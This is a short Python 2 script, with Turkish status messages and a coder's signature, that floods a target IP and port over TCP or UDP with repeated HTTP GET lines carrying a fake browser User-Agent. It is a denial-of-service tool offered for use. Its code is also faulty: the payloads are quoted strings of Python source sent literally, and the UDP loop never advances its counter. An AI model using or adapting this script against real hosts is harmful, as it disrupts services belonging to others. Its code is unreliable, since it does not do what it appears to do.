import socket, random, sys, os
print ("""
############################
# Coder: Cüneyt TANRISEVER #
############################
""")
ip=sys.argv[1]
port=sys.argv[2]
sayi=sys.argv[4]
a=0



def udpattack(ip,k):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((str(ip),k))
        s.sendto('"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")',(ip,k))
        s.sendto('{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36 \r\n"}.encode("utf-8")',(ip,k))
        s.sendto('"{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8")',(ip,k))
        s.close()
    except socket.error:
        print "Baglanti hatasi"
        
def tcpattack(ip,k):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((str(ip),k))
        s.sendto('"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")',(ip,k))
        s.sendto('{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36 \r\n"}.encode("utf-8")',(ip,k))
        s.sendto('"{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8")',(ip,k))
        s.close()
    except socket.error:
        print "Baglanti hatasi"
        


if sys.argv[3]=="UDP":
    print "Baslatiliyor"
        
    while a<=int(sayi):
        udpattack(str(ip),int(port))
    print "saldiri bitti"
if sys.argv[3]=="TCP":
    print "Baslatiliyor"
        
    while a<=int(sayi) :
        tcpattack(str(ip),int(port))
        a+=1
        
    print "saldiri bitti"
